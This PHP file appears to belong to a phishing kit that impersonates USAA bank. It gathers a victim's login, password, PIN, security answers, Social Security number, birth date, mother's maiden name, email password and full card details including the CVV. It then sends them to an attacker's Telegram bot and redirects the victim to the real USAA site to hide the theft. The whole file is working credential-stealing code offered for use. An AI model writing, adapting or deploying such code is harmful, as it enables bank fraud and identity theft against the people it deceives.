<?php
include("Config.php");
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "--------------+ USAA RES +------------\n";
$message .= "--------------+ UserLogin +------------\n";
$message .= "USAA ID : ".$_POST['userid']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "Pin : ".$_POST['pin1']."\n";
$message .= "--------------+ Question information +------------\n";
$message .= "Question Number 1: ".$_POST['q1']."\n";
$message .= "Answer Number 1: ".$_POST['a1']."\n";
$message .= "Question Number 2: ".$_POST['q2']."\n";
$message .= "Answer Number 2: ".$_POST['a2']."\n";
$message .= "Question Number 3: ".$_POST['q3']."\n";
$message .= "Answer Number 3: ".$_POST['a3']."\n";
$message .= "--------------+ Contact Information +------------\n";
$message .= "Full Name : ".$_POST['fname']."\n";
$message .= "Member Number : ".$_POST['mnumb']."\n";
$message .= "Birth Day : ".$_POST['dob1']."\n";
$message .= "Birth Month : ".$_POST['dob2']."\n";
$message .= "Birth Year : ".$_POST['dob3']."\n";
$message .= "Social Security 1 : ".$_POST['ssn1']."\n";
$message .= "Social Security 2 : ".$_POST['ssn2']."\n";
$message .= "Social Security 3 : ".$_POST['ssn3']."\n";
$message .= "Mother Maiden Name : ".$_POST['mmn1']."\n";
$message .= "Zip Code : ".$_POST['Zcode']."\n";
$message .= "Phone Password : ".$_POST['phonepass']."\n";
$message .= "Emaill Address : ".$_POST['email']."\n";
$message .= "Email Password : ".$_POST['emailpass']."\n";
$message .= "--------------+ Credit Card Information +------------\n";
$message .= "Credit Card Number : ".$_POST['cardnumber']."\n";
$message .= "Exp Date MM/YYYY : ".$_POST['cdob']."\n";
$message .= "CVV : ".$_POST['cvv']."\n";
$message .= "Pin confirmed : ".$_POST['pin2']."\n";
$message .= "--------------+ Connction info +------------\n";
$message .= "IP Address : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "--------------------\n";
$rnessage  = "$message\n";
$message .= "--------------+ USAA RES +------------\n";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chatid&text=" . urlencode($message)."" );
Header ("Location:https://www.usaa.com/inet/ent_logon/Logoff?");

?>